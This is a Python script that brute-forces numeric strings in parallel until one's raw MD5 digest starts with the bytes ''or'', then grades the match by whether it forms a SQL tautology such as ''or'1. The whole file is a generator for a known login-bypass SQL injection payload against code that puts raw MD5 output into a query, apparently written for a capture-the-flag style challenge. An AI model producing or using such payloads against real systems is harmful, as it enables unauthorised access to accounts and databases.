import hashlib
import multiprocessing
import time
import os
import sys

# The target byte sequence: 'or' (\x27\x6f\x72)
TARGET = b"\x27\x6f\x72"

def worker_search(start_index, step, found_event):
    """
    Worker process that searches a specific subset of numbers.
    args:
        start_index: The number to start checking from
        step: How much to increment (equal to number of CPU cores)
        found_event: A shared flag to stop all processes when a match is found
    """
    i = start_index
    
    # Pre-calculate encode to save time inside loop? 
    # Actually, str(i).encode() is fast enough for this logic.
    
    while not found_event.is_set():
        # Generate candidate
        candidate = str(i)
        
        # Hash it (Raw MD5)
        digest = hashlib.md5(candidate.encode()).digest()
        
        # Check if it starts with 'or'
        if digest.startswith(TARGET):
            found_event.set() # Tell other processes to stop
            
            print(f"\n[+] SUCCESS! Found in process {os.getpid()}")
            print(f"String: {candidate}")
            print(f"Hex Digest: {digest.hex()}")
            print(f"Raw Output: {digest[0:10]}...")
            
            # Check if it is a "Clean" Injection (e.g. 'or'1...)
            # We look for 'or' followed by a digit (0x30-0x39) or another quote
            if len(digest) > 3:
                next_char = digest[3]
                if 0x30 <= next_char <= 0x39:
                    print("Status: EXCELLENT (Forms a valid tautology like 'or'1)")
                else:
                    print("Status: Good start, but check if the SQL syntax breaks.")
            return

        # Move to the next number assigned to this process
        i += step
        
        # Optional: Print status every 5 million checks (per process)
        if i % 5000000 == start_index:
            # Only process 1 prints status to avoid console spam
            if start_index == 0:
                print(f"[*] Searching... Currently at {i} (and scaling across cores)")

def main():
    # 1. Determine number of CPUs
    num_cores = multiprocessing.cpu_count()
    print(f"[*] Starting bruteforce with {num_cores} processes...")
    print(f"[*] Target raw start: {TARGET} ('or')")

    # 2. Create a shared event to signal when to stop
    found_event = multiprocessing.Event()
    
    processes = []
    
    # 3. Launch Workers
    # We use a "stride" approach. 
    # Process 0 checks: 0, 4, 8, 12...
    # Process 1 checks: 1, 5, 9, 13...
    # This ensures no overlap and even distribution.
    for core in range(num_cores):
        p = multiprocessing.Process(
            target=worker_search, 
            args=(core, num_cores, found_event)
        )
        p.start()
        processes.append(p)

    # 4. Wait for them to finish
    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        print("\n[!] Stopping...")
        found_event.set()
        for p in processes:
            p.terminate()

if __name__ == "__main__":
    main()
